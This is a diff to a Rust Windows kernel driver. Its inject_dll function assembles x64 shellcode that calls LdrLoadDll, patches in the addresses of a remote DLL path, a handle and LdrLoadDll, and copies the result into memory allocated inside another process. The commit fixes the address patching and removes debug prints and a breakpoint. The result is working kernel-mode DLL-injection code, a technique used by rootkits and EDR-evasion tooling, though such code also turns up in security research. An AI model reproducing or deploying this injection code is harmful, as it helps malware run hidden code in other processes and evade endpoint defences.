@@ -3,7 +3,7 @@ use core::{arch::asm, ffi::c_void, iter::once, ptr::null_mut, sync::atomic::Orde
 use alloc::vec::Vec;
 use wdk::{nt_success, println};
 use wdk_sys::{
-    HANDLE, MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, PVOID, UNICODE_STRING,
+    HANDLE, MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, UNICODE_STRING,
     ntddk::{
         PsGetCurrentProcessId, RtlCopyMemoryNonTemporal, RtlInitUnicodeString,
         ZwAllocateVirtualMemory,
@@ -34,7 +34,7 @@ pub fn inject_dll() {
     //
     // Shellcode to load a DLL into a process via LdrLoadDll
     //
-    let shellcode: [u8; 47] = [
+    let mut shellcode: [u8; 47] = [
         0x48, 0x83, 0xEC, 0x28, // sub rsp, 0x28
         0x48, 0x31, 0xD2, // xor rdx, rdx
         0x48, 0x31, 0xC9, // xor rcx, rcx
@@ -139,40 +139,23 @@ pub fn inject_dll() {
     // Memory patching
     //
 
+    const OFF_R8_IMM: usize = 12;
+    const OFF_R9_IMM: usize = 22;
+    const OFF_RAX_IMM: usize = 32;
+    const PTR_WIDTH: usize = size_of::<usize>();
+
+    let val_r8 = remote_memory as usize;
+    let val_r9 = remote_handle_out as usize;
+    let val_rax = ldr_ld_dll_addr as usize;
+
+    //
+    // Write to the shellcode block with the newly allocated addresses and addr of LdrLoadDll
+    //
+    shellcode[OFF_R8_IMM..OFF_R8_IMM + PTR_WIDTH].copy_from_slice(&val_r8.to_le_bytes());
+    shellcode[OFF_R9_IMM..OFF_R9_IMM + PTR_WIDTH].copy_from_slice(&val_r9.to_le_bytes());
+    shellcode[OFF_RAX_IMM..OFF_RAX_IMM + PTR_WIDTH].copy_from_slice(&val_rax.to_le_bytes());
+
     unsafe {
-        //
-        // Write to the shellcode block with the newly allocated addresses and addr of LdrLoadDll
-        //
-
-        // todo we are just writing zeros.. except for the last call which does copy the address..
-        // maybe cos its ldr_ld_dll_addr as *const usize as *const c_void -> as a usize first?
-        let dst = (shellcode.as_ptr() as usize + 12) as *mut c_void;
-        let src = remote_unicode_string as *const *const c_void as *const c_void;
-        println!(
-            "Writing 1, {dst:p}, src: {src:p}, len: {}.",
-            size_of::<PVOID>() as u64
-        );
-        RtlCopyMemoryNonTemporal(dst, src, size_of::<PVOID>() as u64);
-
-        let dst = (shellcode.as_ptr() as usize + 22) as *mut c_void;
-        println!("Writing 2, {dst:p}, src: {remote_handle_out:p}.");
-        RtlCopyMemoryNonTemporal(dst, remote_handle_out, size_of::<PVOID>() as u64);
-
-        let dst = (shellcode.as_ptr() as usize + 32) as *mut c_void;
-        println!(
-            "Writing 3, {dst:p}, src: {:p}.",
-            ldr_ld_dll_addr as *const usize as *const c_void
-        );
-        RtlCopyMemoryNonTemporal(
-            dst,
-            &ldr_ld_dll_addr as *const usize as *const c_void,
-            size_of::<usize>() as u64,
-        );
-
-        println!("Done 3");
-
-        asm!("int3");
-
         // Patch in the shellcode to the remote region in the target process
         RtlCopyMemoryNonTemporal(
             remote_shellcode_memory,
